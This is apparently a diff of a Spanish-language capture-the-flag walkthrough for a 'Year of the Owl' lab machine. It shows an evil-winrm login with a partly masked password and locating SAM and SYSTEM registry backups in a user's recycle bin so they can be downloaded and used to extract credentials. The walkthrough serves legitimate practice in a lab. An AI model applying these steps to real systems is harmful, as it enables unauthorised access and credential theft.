@@ -251,7 +251,7 @@ Enunciado :
         WINRM       10.10.121.136   5985   YEAR-OF-THE-OWL  [+] year-of-the-owl\jareth:sa--- (Pwn3d!)       
    
         
-## Obtenemos sesion en la maquina victima mediante WinRM.
+## Obtenemos sesion en la maquina mediante WinRM.
 
     ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/year_ofthe_owl]
     └─# evil-winrm -i 10.10.38.87 -u jareth -p sa---
@@ -284,26 +284,23 @@ Enunciado :
 
 1) Obtenemos el SID del usuario actual en este caso jareth que es lo que nos interesa.
     
-      *Evil-WinRM* PS C:\Users\Jareth\Desktop> whoami /user
-
-      USER INFORMATION
-      ----------------
-      
-      User Name              SID
-      ====================== =============================================
-      year-of-the-owl\jareth S-1-5-21-1987495829-1628902820-919763334-1001
+        *Evil-WinRM* PS C:\Users\Jareth\Desktop> whoami /user
+  
+        USER INFORMATION
+        ----------------
+        
+        User Name              SID
+        ====================== =============================================
+        year-of-the-owl\jareth S-1-5-21-1987495829-1628902820-919763334-1001
   
 2) Obtenemos el cotenido de su papelera de reciclaje.
 
-      *Evil-WinRM* PS C:\Users\Jareth\Desktop> cd 'c:\$recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001'\
-  
-      
-      *Evil-WinRM* PS C:\$recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001> dir
-
-        Mode                LastWriteTime         Length Name
-        ----                -------------         ------ ----
-        -a----        9/18/2020   7:28 PM          49152 sam.bak
-        -a----        9/18/2020   7:28 PM       17457152 system.bak
+        *Evil-WinRM* PS C:\Users\Jareth\Desktop> cd 'c:\$recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001'\
+          
+          Mode                LastWriteTime         Length Name
+          ----                -------------         ------ ----
+          -a----        9/18/2020   7:28 PM          49152 sam.bak
+          -a----        9/18/2020   7:28 PM       17457152 system.bak
 
 3) Nos descargamos los dos ficheros a nuestra maquina.
 
